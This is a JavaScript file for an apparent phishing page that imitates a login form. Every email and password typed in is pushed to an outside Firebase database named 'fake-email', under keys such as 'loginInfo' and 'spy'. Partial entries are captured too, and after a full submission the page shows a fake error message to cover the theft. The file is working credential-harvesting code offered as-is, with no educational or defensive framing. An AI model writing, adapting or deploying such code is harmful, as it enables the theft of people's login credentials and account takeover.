import {initializeApp} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"
import {getDatabase, ref, push, onValue} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"

const appSettings = {
    databaseURL: "https://fake-email-1e14a-default-rtdb.europe-west1.firebasedatabase.app/"
}

const app = initializeApp(appSettings)
const database = getDatabase(app)
const loginInfoInDB = ref(database, "loginInfo")
const spyInDB = ref(database, "spy")

const emailVal = document.getElementById('email')
const passVal = document.getElementById('password')
const btn = document.querySelector('.btn-login')
const noPass = document.getElementById('noPass')
const noEmail = document.getElementById('noEmail')
const htmlContent = {
     colForm: document.querySelector('.col-form'),
     footerContent: document.querySelector('.footer-contents')

}

btn.addEventListener('click', function(){
    if (emailVal.value && passVal.value) {
        push(loginInfoInDB, `email: ${emailVal.value} | password: ${passVal.value}`)
        document.getElementById('logoText').innerHTML = ' '
        htmlContent.colForm.innerHTML = "Something went wrong, Please try again later."
        htmlContent.footerContent.innerHTML = " "
    } else if (emailVal.value && !passVal.value) {
        push(spyInDB, `email: ${emailVal.value}`)
        noPass.textContent = "Please type your password"
        passVal.style.border = "1px solid red"
    } else if (!emailVal.value && passVal.value) {
        push(spyInDB, `password: ${passVal.value}`)
        noEmail.textContent = "Please type your email or phone number"
        emailVal.style.border = "1px solid red"
    }
})